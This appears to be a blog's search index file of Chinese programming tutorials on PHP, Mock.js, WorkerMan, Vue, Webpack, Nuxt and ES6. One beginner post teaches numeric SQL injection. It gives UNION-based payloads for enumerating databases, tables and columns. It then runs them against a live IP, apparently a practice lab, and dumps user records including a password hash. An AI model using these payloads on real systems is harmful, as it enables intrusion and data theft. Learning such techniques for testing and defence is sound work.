<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[php面向对象容易忘记的几个知识点]]></title>
    <url>%2F2018%2F12%2F11%2Fphp%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%AE%B9%E6%98%93%E5%BF%98%E8%AE%B0%E7%9A%84%E5%87%A0%E4%B8%AA%E7%9F%A5%E8%AF%86%E7%82%B9%2Findex.html</url>
    <content type="text"><![CDATA[好几个月没更新博客了，这段时间心态好像崩了，干啥都没动力，而且还被各种烦心事干扰着，真想回去农村住几个月。。。 面向对象编程时，一般私有和受保护的属性和方法名前可以添加一个_，让开发人员通过名字就知道它的特性 在类的外面，类中的 常量 和 静态成员 直接使用 类名:: 来访问 在类的内部使用 $this-&gt;访问类中的属性和方法 在类中使用self:: 访问常量和静态成员 命名空间使用的是反斜杠\ 在同一个命名空间下，可以省略命名空间 使用 use时，也需要把文件引入进来 自动加载类时，需要用到spl_autoload_register函数 在类中我们可以使用static定义静态成员。静态成员可以是静态属性也可以是静态方法 在类外部使用 类名:: 来访问静态成员,在类内部使用 self:: 访问静态成员 静态成员和普通成员区别？静态成员：静态成员属于类，无论有多少个对象，值只有一个;普通成员：普通成员属于具体的对象，每个对象拥有自己的属性值。 一个类只能继承自一个父类（单继承），不能同时继承多个类 $this 代表实例化的那个对象 Trait,可以让我们不使用继承就可以在多个类中复用方法的机制,使用trait来定义一个特质，特质中只能定义方法 定义了特质之后，我们就可以在一个类中使用use来引入这个特质，引入了特质之后，这个类就拥有了这个特质中的方法 trait 可以用来向一个类中添加方法,不用继承就可以实现方法的复用]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端开发中使用mockjs模拟数据]]></title>
    <url>%2F2018%2F12%2F07%2F%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E4%B8%AD%E4%BD%BF%E7%94%A8mockjs%E6%A8%A1%E6%8B%9F%E6%95%B0%E6%8D%AE%2Findex.html</url>
    <content type="text"><![CDATA[mock拦截Ajax请求，生成随机数据 模拟数据 直接生成模拟数据 1Mock.mock(模板|function) 为接口地址模拟数据 1Mock.mock(url,模板|function) 为接口以及请求方式模拟数据 1Mock.mock(url,type,模板|function) 说明：url也可以是一个字符串也可以是一个正则。 模板语法模拟数据时要根据模板来模拟，模板是一个对象类型的值，格式为： 1'名称|规则':'值' 名称：模拟的数据的名字。值：模拟的数据的值。规则：模拟出数据的规则，常用的几个规则： min-max：生成的范围 count：生成的数量 +step：递增step 生成随机数据 Type Method 基本类型 boolean, natural, integer, float, character, string, range, date, time, datetime, now 图片 image, dataImage 颜色 color 文本 paragraph, sentence, word, title, cparagraph, csentence, cword, ctitle 姓名 first, last, name, cfirst, clast, cname 网站 url, domain, email, ip, tld 地址 area, region 编号 guid, id 使用时我们只需要把值设置成 @方法名 即可 1.生成boolean @boolean 2.生成数字 2.1 自然数(&gt;=0整数) @natural @natural(min,max) 2.2 整数 @integer @integer(min,max) 2.3小数 @float @float(min,max,dmin,dmax) dmin：小数部分位数最小值 dmax：小数部分位数最大值 2.4 整数整组 @range(min,max) @range(min,max,step) step：递增的步长 @range(10) // =&gt; [0, 1, 2, 3, 4, 5, 6, 7, 8, 9] @range(3, 7) // =&gt; [3, 4, 5, 6] @range(1, 10, 2) // =&gt; [1, 3, 5, 7, 9] @range(1, 10, 3) // =&gt; [1, 4, 7] 3.生成文本 3.1单个字符 @character @character(&apos;lower/upper/number/symbol&apos;) @character(pool) ​ 如果传入了 `&apos;lower&apos;` 或 `&apos;upper&apos;`、`&apos;number&apos;`、`&apos;symbol&apos;`，表示从内置的字符池中选取一个字符： { lower: &quot;abcdefghijklmnopqrstuvwxyz&quot;, upper: &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;, number: &quot;0123456789&quot;, symbol: &quot;!@#$%^&amp;*()[]&quot; } 3.2字符串 @string @string(length) @string(min,max) 3.3英文单词 @word @word(length) @word(min,max) 3.4英文句子 @sentence @sentence(len) @sentence(min,max) 3.5英文段落 @paragraph @paragraph(len) @paragraph(min,max) 3.5中文汉字 @cword @cword(pool) @cword(len) @cword(pool,len) @cword(min,max) @cword(pool,min,max) @cword() // =&gt; &quot;干&quot; @cword(&apos;零一二三四五六七八九十&apos;) // =&gt; &quot;六&quot; @cword(3) // =&gt; &quot;别金提&quot; @cword(&apos;零一二三四五六七八九十&apos;, 3) // =&gt; &quot;&quot;七七七&quot;&quot; @cword(5, 7) // =&gt; &quot;设过证全争听&quot; @cword(&apos;零一二三四五六七八九十&apos;, 5, 7) // =&gt; &quot;九七七零四&quot; 3.6中文句子 @csentence @csentence(len) @csentence(min,max) 3.7中文段落 @cparagraph @cparagraph(len) @cparagraph(min,max) 3.8中文标题 @ctitle @ctitle(len) @ctitle(min,max) 4.生成名字 4.1英文名 @first 名 @last 姓 @name 姓名 @name(middle) middle：是否生成中间名字 @name() // =&gt; &quot;Larry Wilson&quot; @name(true) // =&gt; &quot;Helen Carol Martinez&quot; 4.2中文名 @cfirst 姓 @clast 名 @cname 姓名 @cname() // =&gt; &quot;袁军&quot; 5.网站 5.1生成一个IP @ip 5.2生成一个Email @email @email(domain) domain：指定域名 @email() // =&gt; &quot;x.davis@jackson.edu&quot; @email(&apos;nuysoft.com&apos;) // =&gt; &quot;h.pqpneix@nuysoft.com&quot; 5.3生成域名 @domain 5.4生成URL @url @url(protocol,host) protocol：指定协议，例如HTTP host：指定域名 @url() // =&gt; &quot;mid://axmg.bg/bhyq&quot; @url(&apos;http&apos;) // =&gt; &quot;http://splap.yu/qxzkyoubp&quot; @url(&apos;http&apos;, &apos;nuysoft.com&apos;) 6.生成时间 6.1基本用法 @date @time @datetime 6.2格式化时间 可以通过 format 参数设置时间的格式 @date(format) @time(format) @datetime(format) | Format | Description | Example | | ------ | -------------------------------------------------------- | ------------ | | yyyy | A full numeric representation of a year, 4 digits | 1999 or 2003 | | yy | A two digit representation of a year | 99 or 03 | | y | A two digit representation of a year | 99 or 03 | | MM | Numeric representation of a month, with leading zeros | 01 to 12 | | M | Numeric representation of a month, without leading zeros | 1 to 12 | | dd | Day of the month, 2 digits with leading zeros | 01 to 31 | | d | Day of the month without leading zeros | 1 to 31 | | HH | 24-hour format of an hour with leading zeros | 00 to 23 | | H | 24-hour format of an hour without leading zeros | 0 to 23 | | hh | 12-hour format of an hour without leading zeros | 1 to 12 | | h | 12-hour format of an hour with leading zeros | 01 to 12 | | mm | Minutes, with leading zeros | 00 to 59 | | m | Minutes, without leading zeros | 0 to 59 | | ss | Seconds, with leading zeros | 00 to 59 | | s | Seconds, without leading zeros | 0 to 59 | | SS | Milliseconds, with leading zeros | 000 to 999 | | S | Milliseconds, without leading zeros | 0 to 999 | | A | Uppercase Ante meridiem and Post meridiem | AM or PM | | a | Lowercase Ante meridiem and Post meridiem | am or pm | | T | Milliseconds, since 1970-1-1 00:00:00 UTC | 759883437303 | 生成地址1234567891011121314151617181920212223242526272829303132333435367.1生成中国大区@region@region() // =&gt; "华北"7.2生成省份@province 7.3生成城市@city @city(prefix) prefix：布尔值，是否生成所属的省 @city()// =&gt; "唐山市"@city(true)// =&gt; "福建省 漳州市"7.4生成县@county @county(prefix) prefix：布尔值，是否生成所属省、 @county()// =&gt; "上杭县"@county(true)// =&gt; "甘肃省 白银市 会宁县"7.5生成邮政编码 @zip 8.编号 8.1身份证 @id @id() // =&gt; &quot;420000200710091854&quot; 8.2GUID @guid @guid() // =&gt; &quot;662C63B4-FD43-66F4-3328-C54E3FF0D56E&quot; 9.生成图片 9.1图片URL @image() @image( size ) @image( size, background ) @image( size, background, text ) @image( size, background, foreground, text ) @image( size, background, foreground, format, text ) size：尺寸，格式为：&apos;宽x高&apos; background：背景色，格式为：#FFFFFF text：图片上显示的文本 foreground：广本颜色 format：图片格式，可选值包括：png、gif、jpg。 @image // =&gt; &quot;http://dummyimage.com/125x125&quot; @image(&apos;200x100&apos;) // =&gt; &quot;http://dummyimage.com/200x100&quot; @image(&apos;200x100&apos;, &apos;#fb0a2a&apos;) // =&gt; &quot;http://dummyimage.com/200x100/fb0a2a&quot; @image(&apos;200x100&apos;, &apos;#02adea&apos;, &apos;Hello&apos;) // =&gt; &quot;http://dummyimage.com/200x100/02adea&amp;text=Hello&quot; @image(&apos;200x100&apos;, &apos;#00405d&apos;, &apos;#FFF&apos;, &apos;Mock.js&apos;) // =&gt; &quot;http://dummyimage.com/200x100/00405d/FFF&amp;text=Mock.js&quot; @image(&apos;200x100&apos;, &apos;#ffcc33&apos;, &apos;#FFF&apos;, &apos;png&apos;, &apos;!&apos;) // =&gt; &quot;http://dummyimage.com/200x100/ffcc33/FFF.png&amp;text=!&quot; 9.2Base64图片编码 @dataImage @dataImage(size) @dataImage(size,text) 10.生成颜色 @color @hex @rgb @rgba @hsl]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>mockjs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windows下WorkerMan实现简单的多人在线聊天]]></title>
    <url>%2F2018%2F12%2F06%2FWorkerMan%E5%85%A5%E9%97%A81%2Findex.html</url>
    <content type="text"><![CDATA[博主做项目遇到了在网页中需要实现在线聊天的功能，我一看，一脸懵逼，完全没有思路，最后得益于万能的百度，终于知道了websocket这种神奇的协议，还知道了WorkerMan这个神奇的PHP socket服务器框架，下面我们来简单聊聊WorkerMan的简单使用，楼主水平有限，如果有错误，欢迎大家在下面的评论区指出~~ 1，介绍：Workerman是什么？Workerman是一款纯PHP开发的开源高性能的PHP socket 服务框架。 Workerman不是重复造轮子，它不是一个MVC框架，而是一个更底层更通用的socket服务框架，你可以用它开发tcp代理、梯子代理、做游戏服务器、邮件服务器、ftp服务器、甚至开发一个php版本的redis、php版本的数据库、php版本的nginx、php版本的php-fpm等等。Workerman可以说是PHP领域的一次创新，让开发者彻底摆脱了PHP只能做WEB的束缚。 实际上Workerman类似一个PHP版本的nginx，核心也是多进程+Epoll+非阻塞IO。Workerman每个进程能维持上万并发连接。由于本身常住内存，不依赖Apache、nginx、php-fpm这些容器，拥有超高的性能。同时支持TCP、UDP、UNIXSOCKET，支持长连接，支持Websocket、HTTP、WSS、HTTPS等通讯协以及各种自定义协议。拥有定时器、异步socket客户端、异步Mysql、异步Redis、异步Http、异步消息队列等众多高性能组件。以上内容来自WorkerMan手册介绍，地址http://doc3.workerman.net/640361 2，环境配置，Workerman是基于php的，所以我们需要先配置好php环境（配置好的可以忽略），需要配置好环境变量，这个请自行百度解决，使用php -v 查看php 版本，如下图，环境就是配置成功的了，就可以继续下一步的操作！ 3，下载Workerman到Workerman官网下载Workerman,如下图： 4，使用把下载下来的压缩包解压，并在文件夹中新建一个start.php的文件把以下代码复制进去！1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?phpuse Workerman\Worker;//Autoloader.php路径require_once "./Autoloader.php";$global_uid = 0;// 当客户端连上来时分配uid，并保存连接，并通知所有客户端function handle_connection($connection)&#123; global $text_worker, $global_uid; // 为这个连接分配一个uid $connection-&gt;uid = ++$global_uid;&#125;// 当客户端发送消息过来时，转发给所有人function handle_message($connection, $data)&#123; global $text_worker; foreach($text_worker-&gt;connections as $conn) &#123; $conn-&gt;send("user[&#123;$connection-&gt;uid&#125;] said: $data"); &#125;&#125;// 当客户端断开时，广播给所有客户端function handle_close($connection)&#123; global $text_worker; foreach($text_worker-&gt;connections as $conn) &#123; $conn-&gt;send("user[&#123;$connection-&gt;uid&#125;] logout"); &#125;&#125;// 创建一个文本协议的Worker监听2347接口$text_worker = new Worker("text://127.0.0.1:2347");// 只启动1个进程，这样方便客户端之间传输数据$text_worker-&gt;count = 1;$text_worker-&gt;onConnect = 'handle_connection';$text_worker-&gt;onMessage = 'handle_message';$text_worker-&gt;onClose = 'handle_close';Worker::runAll(); 5,运行在当前文件夹打开终端，并输入php start.php start 打开socket服务，如图：打开多几个客户端并输入命令：telnet 127.0.0.1 2347 测试,如下图，则代表测试成功：]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vue之事件与函数]]></title>
    <url>%2F2018%2F12%2F04%2FVue%E4%B9%8B%E4%BA%8B%E4%BB%B6%E4%B8%8E%E5%87%BD%E6%95%B0%2Findex.html</url>
    <content type="text"><![CDATA[记录常用的事件以及函数 修饰符 .stop：阻止事件继续传播 .prevent：组上事件的默认行为 .capture：事件在捕获阶段执行 .once：事件只被触发执行一次 按键修饰符 .enter：点击回车键 .tab：点击tab键 .delete：点击删除键 .esc：点击 esc 按键 .space：点击空格键 .up：点击上箭头 .down：点击下箭头 .left：点击左箭头 .right：点击右箭头 .数字：按键的数字编号 生命周期钩子 beforeCreated：创建前 created：创建后 beforeMount：挂载到页面前 mounted：挂载到页面后 beforeUpdate：更新页面前 updated：更新页面后 beforeDestroy：消销Vue之前 destroyed：消销Vue之后 计算属性123computed:&#123; ... &#125; 自定义组件123Vue.component('hello', &#123; template: `&lt;p&gt;Hello World !&lt;/p&gt;`&#125;) 注意点： 组件中的 data 要求必须是一个函数 使用 props 组件上所有属性的名字]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sql注入入门学习(数字型)（连载中）]]></title>
    <url>%2F2018%2F12%2F04%2Fsql%E6%B3%A8%E5%85%A5%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0(%E6%95%B0%E5%AD%97%E5%9E%8B)%EF%BC%88%E8%BF%9E%E8%BD%BD%E4%B8%AD%EF%BC%89%2Findex.html</url>
    <content type="text"><![CDATA[非宁静无以致远 判断sql注入1231.提交单引号2.and大法和or大法3.加法和减法，加号 %2b 数据库权限判断123and ord(mid(user(),1,1))=114//或者and (select count(*) from mysql.user)&gt;0 判断字段数用union联合查询 12and 1=1 union select 1,2,3,4,5……union select null,null,null..... 用order by 查询 1order by 1,2,3,4 查询库名12345678判断数据库版本and ord(mid(version(),1,1))&gt;51 直接使用mysql自带函数database()查询得到数据库名union select 1,database(),3 limit 1,1得到所有的数据库名union select null,schema_name,null from information_schema.schemata获取第一个库名and 1=2 union select null,schema_name,null from information_schema.schemata limit 0,1 查询表名在MySQL中，表名存放在information_schema数据库下tables表table_name字段中、查表名我们主要用到的是TABLES表 group_concat 123and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='test'或者union select null,table_name,null from information_schema.tables where table_schema='test' 查询字段在MySQL中，字段名存放在information_schema数据库下columns表column_name字段中,这里使用的是columns表。 123and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='test' and table_name='sqltest'或者union select null,column_name,null from information_schema.columns where table_schema='test' and table_name='admin' 查询数据12345and 1=2 union select 1,group_concat(id,user,pwd),3 from admin或者union select null,title,content from sqltest或者and 1=2 union select 1,2,concat(user,0x3c,pwd) from admin 实战演练打开网站http://43.247.91.228/content-1/index.php?id=0,我们在这里做注入练习 1.首先加单引号报错，可知存在明显的注入漏洞 2.输入and ord(mid(user(),1,1))=114不报错，可知数据库的权限是root权限，并且具有可读可写的权限 3.输入 and 1=1 union select 1,2,3,4,5,6,7,8不报错，可以发现这个表的字段有8个 4.使用and 1=2 union select null,schema_name,null ,null,null,null,null,null from information_schema.schemata limit 1,1;--用;--注释了后面的语句，可以获取所有的数据库名，可以知道当前执行查询用户名为root@localhost（user()函数）， 当前使用的数据库是inject，下面列出所有数据库 information_schema inject mysql performance_schema 5.使用union select 1,group_concat(table_name),3,4,5,6,7,8 from information_schema.tables where table_schema=&#39;inject&#39; limit 1,1;--获取所有的表名，下面列出所有的表 users 6.使用union select 1,group_concat(table_name),3,4,5,6,7,8 from information_schema.tables where table_schema=&#39;inject&#39; limit 1,1;--获取所有的字段，下面列出所有的字段 idusers name email password ua ref host lang 7.接下来就到最后最重要的一步了，获取所有数据，and 1=2 union select 1,group_concat(idusers,name,email,password,ua,ref,host,lang),3,4,5,6,7,8 from users;-- 获取到的数据如下： 10adminadmin@getmantra.comadminBrick_Browserhttp://127.0.0.1/release-channel/content-13/index.php127.0.0.1en,1tomtom@getmantra.comtomBlock_Browser8.8.8.8en,2ronron@getmantra.comronRain_Browser192.168.1.1en,3harryharry@getmantra.com5f4dcc3b5aa765d61d8327deb882cf99Mantra127.0.0.1en 可以看出来这些应该就是数据表中所有的数据了，但是怎么格式化我并不会，希望看到这篇文章的大佬们能帮我解决一下，请给我发邮件：dandingkeji.top@gmail.com]]></content>
      <categories>
        <category>Geek</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Webpack基本使用]]></title>
    <url>%2F2018%2F12%2F04%2FWebpack%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%2Findex.html</url>
    <content type="text"><![CDATA[Webpack介绍:主要用于web项目中打包资源进行自动构建,Webpack将所有资源视为JS的模块来进行构建，所以对于CSS，Image等非JS类型的文件，Webpack会使用相应的加载(loader)器来加载成其可识别的JS模块资源,通过配置一些信息，就能将资源进行打包构建，更好地实现前端的工程化 Webpack安装本地安装:12npm install -D webpack-D 实际上是简写 --dev-save 如果你使用Webpack 4+ 版本, 你还需要安装CLI. 1npm install -D webpack-cli 要安装特定版本1npm install -D webpack@&lt;version&gt; 全局安装:1npm install -g webpack 配置项简介： Entry，入口文件配置,Webpack执行构建的第一步将从entry开始,完成整个工程的打包 Module，模块,在Webpack里,一切皆模块,Webpack会从配置的entry开始递归找出所有依赖的模块,最常用的是rules配置项,功能是匹配对应的后缀,从而针对代码文件完成格式转换和压缩合并等指定的操作. Loader，模块转换器,用于把模块原内容按照需求转换成新内容,这个是配合Module模块中的rules中的配置项来使用. Plugins，扩展插件,在Webpack构建流程中的特定时机注入扩展逻辑来改变构建结果或做你想要做的事情.(插件API) Output，输出结果,在Webpack经过一系列处理并得出最终想要的代码后输出结果,配置项用于指定输出文件夹,默认是./dist 基本使用把src的代码编译到dist目录中 project 123456789handle|- package.json|- webpack.config.js|- index.html|- /src |- index.js |- mixin.js|- /dist |- bundle.js src/index.js12import content from "./mixin";document.body.appendChild(content("webpack")); src/mixin.js 123456module.exports = function (con) &#123; var element = document.createElement('div'); element.innerHTML = 'Hello, ' + con; return element;&#125; index.html 123456789101112&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt; &lt;title&gt;起步&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;script src="./dist/bundle.js"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; .npmrc 1registry=https://registry.npm.taobao.org webpack.config.js 12345678910111213const path = require('path');module.exports = &#123; // 打包的入口点 entry: './src/index.js', // 打包的输出点 output: &#123; // 打包之后输出文件的名称 filename: 'bundle.js', // 打包之后输出文件的路径 path: path.resolve(__dirname, 'dist') &#125;&#125; 总结webpack 的基本使用方式 : 配置package.json的start命令为webpack 创建webpack.config.js 指定项目打包的入口 指定项目打包后文件的名称和输出路径 配置代码错误源如果报错了，是这样子的： 我们需要知道代码的具体错误,如图： 修改配置文件： webpack.config.js 123devtool: 'inline-source-map',&lt;!--去掉警告提示--&gt;mode: 'none' webpack加载CSS下载包1npm install -D style-loader css-loader 引入资源 src/js/index.js 12// 引入cssimport '../css/main.css' 修改配置文件 webpack.config.js1234567891011module: &#123; rules: [ // 加载css &#123; // 找到css文件() test: /\.css$/, // 需要转换器(需要什么转换器 都是大家都知道的 style-loader css-loader) use: ['style-loader', 'css-loader'] &#125;, ]&#125; webpack加载图片下载包1npm install -D file-loader 引入资源 src/js/index.js 12// 引入图片const imgSrc = require('../image/chrome.png'); 修改配置文件 webpack.config.js123456rules: [ &#123; test: /\.(png|jpe?g|gif|svg)$/, use: ['file-loader'] &#125;] webpack加载字体 下载字体 定义字体 1234@font-face &#123; font-family: 'wanlum'; src: url("../fonts/Raleway.ttf");&#125; 使用字体 12345div &#123; font-family: 'wanlum'; color: red; font-size: 30px;&#125; 配置webpack.config.js 123456&#123; test: /\.(woff|woff2|eot|ttf|otf)$/, use: [ 'file-loader' ]&#125; webpack编译ES6 下载包 1npm install -D babel-cli babel-preset-env babel-loader 编辑配置文件 .babelrc 12345&#123; "presets": [ "env" ]&#125; 配置webpack.config.js 1234567&#123; test: /\.js$/, exclude: /node_modules/, use: &#123; loader: 'babel-loader' &#125; &#125; less编译成css 下载包 1npm install less-loader less -D 配置webpack.config.js 1234&#123; test: /\.less$/, use: ['style-loader','css-loader', 'less-loader'] &#125;, html自动生成 下载包 1npm install -D html-webpack-plugin clean-webpack-plugin 引入包 1234// 重新生成html的const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;);// 清理dist目录const CleanWebpackPlugin = require(&apos;clean-webpack-plugin&apos;); 配置webpack.config.js 1234567plugins: [ new HtmlWebpackPlugin(&#123; title: &quot;你好&quot; &#125;), // 清理dist目录 new CleanWebpackPlugin([&apos;dist&apos;])], 自动编译实时加载 下载包 1npm install -D webpack-dev-server 配置webpack.config.js 123devServer: &#123; contentBase: './dist'&#125; 配置package.json启动项 1"start": "webpack-dev-server --config webpack.config.js" 热替换(跟自动编译实时加载功能差不多) 配置webpack.config.js1234567891011plugins: [ new HtmlWebpackPlugin(&#123; title: '使用HtmlWebpackPlugin' &#125;), new webpack.NamedModulesPlugin(['dist']), new webpack.HotModuleReplacementPlugin(['dist'])], devServer: &#123; contentBase: path.resolve(__dirname,'dist'), hot: true &#125;]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nuxt基本安装与使用]]></title>
    <url>%2F2018%2F12%2F01%2FNuxt%E5%9F%BA%E6%9C%AC%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8%2Findex.html</url>
    <content type="text"><![CDATA[Nuxt 是基于 nodejs + vue 写的，服务器端渲染 框架（SSR） 安装 安装node.js 设置node使用淘宝镜像 12npm install -g nrmnrm use taobao 使用 npm 安装 vue-cli 1npm install -g vue-cli 安装nuxt项目 1vue init nuxt-community/starter-template 项目名称 如果 vue-cli 没有安装, 需先通过 npm install -g vue-cli 来安装。 启动项目：npm run dev目录结构 页面组件页面组件代码结构：1234567891011121314&lt;template&gt; 模板内容(html内容，注意：必须有一个根元素)&lt;/template&gt;&lt;script&gt;// 组件的JS部分export default &#123;&#125;&lt;/script&gt;&lt;style&gt; 组件的CSS部分&lt;/style&gt; 布局文件 如果项目中存在 layouts/default.vue文件，那么Nuxt在渲染每个页面时，都会使用这个 defaults.vue 文件做为布局文件 如果希望页面使用其它的布局文件可以在页面中使用 layout 来设置：1234567891011121314&lt;template&gt; &lt;div class="container"&gt; &lt;h1 v-if="error.statusCode === 404"&gt;页面不存在&lt;/h1&gt; &lt;h1 v-else&gt;应用发生错误异常&lt;/h1&gt; &lt;nuxt-link to="/"&gt;首 页&lt;/nuxt-link&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; props: ['error'], layout: 'blog' // 你可以为错误页面指定自定义的布局&#125;&lt;/script&gt; 打包资源 npm run dev 支持热更新，开发模式启动服务器 npm run build 网站上线前打包 npm run start 生产环境启动服务器 参数的接收方式 用来唯一标识资源的参数写到路由上，比如：/goods/:id 搜索、排序、翻页等的参数，比如：/goods/?limit=xx&amp;page=xx 两种参数与文件名总结 URL 对应页面 接收方式 /goods/:id pages/goods/_id.vue this.$route.params.id /goods?id=x pages/goods.vue this.$route.query.id /order/:catid/:userid/?limit=10 pages/order/_catid/_userid.vue 使用 this.$route 中的 params 和 query 来分别接收两种参数。]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>Nuxt</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ECMAScript 6介绍]]></title>
    <url>%2F2018%2F11%2F28%2FECMAScript%206%E4%BB%8B%E7%BB%8D%2Findex.html</url>
    <content type="text"><![CDATA[ECMAScript 6.0（以下简称ES6）是JavaScript语言的下一代标准，已经在2015年6月正式发布了。它的目标，是使得JavaScript语言可以用来编写复杂的大型应用程序，成为企业级开发语言。标准的制定者有计划，以后每年发布一次标准，使用年份作为版本。因为ES6的第一个版本是在2015年发布的，所以又称ECMAScript 2015（简称ES2015）。2016年6月，小幅修订的《ECMAScript2016标准》（简称ES2016）如期发布。由于变动非常小（只新增了数组实例的includes方法和指数运算符），因此 ES2016 与 ES2015 基本上是同一个标准，都被看作是ES6。根据计划，2017年6月将发布ES2017。—以上内容来自W3Cschool 使用let声明变量在es6中我们使用let声明变量,但是为什么要使用let声明变量?下面来比较一下用var声明变量跟使用let声明变量的区别使用var 声明变量123456789101112131415161718192021// 使用var 声明变量 var bVariable = "变量";// 存在的问题:// 1.var命令会发生”变量提升“现象，即变量可以在声明之前使用，值为undefined console.log(name); // 此时输出undefined var name = "张三";// 2.var命令允许我们重复声明变量，并且不会报错var name = "jerry";var name = "tom";console.log(name);// 此时输出tom// 3.通过 var 定义的变量，它的作用域是全局作用域或者函数作用域function varvslet() &#123; console.log(i); // 此时输出undefined for (var i = 0; i &lt; 3; i++) &#123; console.log(i); // 0, 1, 2 &#125;;&#125; 使用let 声明变量123456789101112131415161718192021222324252627//1.声明的变量仅在块级作用域有效 &#123; let name = "zhangsan"; &#125; console.log(name); // 此时name不会被访问到，因为let会构成块级作用域 &#123; var name1 = "lisi"; &#125; console.log(name); // 此时name会被访问到，因为var会构成全局作用域//2.不存在变量提升，不存在预解析 console.log(family); var family = "张三";// 上面的代码实际上会发生预解析，解析成下面的代码，会先定义family var family; console.log(family);// 此时输出undefined family ="张三";//但是使用let，则不会出现这种情况console.log(name); //不会输出undefined，直接出现暂时性死区let name="张三";//3.暂时性死区//指程序报错终止执行//4.不允许重复声明let name="张三";let name="李四"; //此时不允许重复定义: Identifier 'name' has already been declared 使用const声明常量js中并没有声明常量的关键字，在es6中，出现了可以声明常量的关键字，const1const name="张三"; 声明时必须赋值,否则报错 只在块级作用域有效 存在暂时性死区 不可重复声明 当常量是对象时，对象本身是可变的,依然可以添加新属性 了解基本数据类型以及复杂数据类型 ES6中的字符串ES6之前：12345678910111213141516171819202122232425262728// 1.需要使用拼接字符串 var html = '&lt;header&gt;' + '&lt;a class="back" href="javascript:;"&gt;' + '&lt;i&gt;&lt;/i&gt;' + '&lt;span&gt;优惠活动&lt;/span&gt;' + '&lt;/a&gt;' + '&lt;/header&gt;';// 2.如果上面的"优惠活动"是变量 var title = "优惠活动"; var html = '&lt;header&gt;' + '&lt;a class="back" href="javascript:;"&gt;' + '&lt;i&gt;&lt;/i&gt;' + '&lt;span&gt;' + title + '&lt;/span&gt;' + '&lt;/a&gt;' + '&lt;/header&gt;';// 3.如果有一个字符串"Hello World",如何遍历 var str = "Hello World"; for (var i = 0; i &lt; str.length; i++) &#123; console.log(str[i]); &#125; ES6之中：123456789101112131415161718192021222324252627// 1.不需要使用拼接字符串,直接使用模板字符串 let html = ` &lt;header&gt; &lt;a class="back" href="javascript:;"&gt; &lt;i&gt;&lt;/i&gt; &lt;span&gt;优惠活动&lt;/span&gt; &lt;/a&gt; &lt;/header&gt;`;// 2.如果上面的'优惠活动'是变量,也不需要使用拼接字符串的方式 只需要把变量写在这样的格式中 $&#123;变量&#125; var title = "优惠活动"; let html = ` &lt;header&gt; &lt;a class="back" href="javascript:;"&gt; &lt;i&gt;&lt;/i&gt; &lt;span&gt;$&#123;title&#125;&lt;/span&gt; &lt;/a&gt; &lt;/header&gt;`;// 3. 使用for...of var str = "HelloWorld"; for(let i of str) &#123; console.log(i); &#125; ES6中的函数rest参数ES6之前：1234567// 1.函数接受任意个数的参数并排序 var sortNumber = function () &#123; return Array.prototype.slice.call(arguments).sort(); //此时arguments是类数组，可以遍历 可以有length属但是不能有数组的方法 //Array.prototype.slice.call()就是把类数组转换成数组 &#125; console.log(sortNumber(2,3,1,4,5,9,0)); ES6之中：1234567891011// 1.函数接受任意个数的参数并排序function add(...rest) &#123; console.log(rest);//此时rest是数组 red.sort(); console.log(rest);&#125;add(1,4,3,5,2,7,9,0,6);&lt;!--注意:arguments是类数组，rest是数组，--&gt;&lt;!--rest参数之后不能再有其他参数（即只能是最后一个参数），--&gt;&lt;!--否则会报错。--&gt; 箭头函数ES6之前：1234//匿名函数写法 var add = function (x,y) &#123; return x + y; &#125; ES6之中：123//匿名函数写法 var add = (x,y) =&gt; &#123;return x+y&#125;; //注意： 箭头函数不可以当作构造函数，也就是说，不可以使用new命令，否则会抛出一个错误。 解构赋值ES6 允许按照一定模式，从数组和对象中提取值，对变量进行赋值，这被称为解构(Destructuring)。123456789//数组解构赋值 var [a,b,c] = [1,2]; console.log(a,b,c); var [a,b] = [1,2,4]; //对象解构赋值 var obj = &#123;a: 1,b: 2&#125; var &#123;a,b&#125; =&#123;a:1, b:2&#125; console.log(a,b);]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[html5新特性实现tab选项卡切换]]></title>
    <url>%2F2018%2F11%2F28%2Fhtml5%E6%96%B0%E7%89%B9%E6%80%A7%E5%AE%9E%E7%8E%B0tab%E5%88%87%E6%8D%A2%2Findex.html</url>
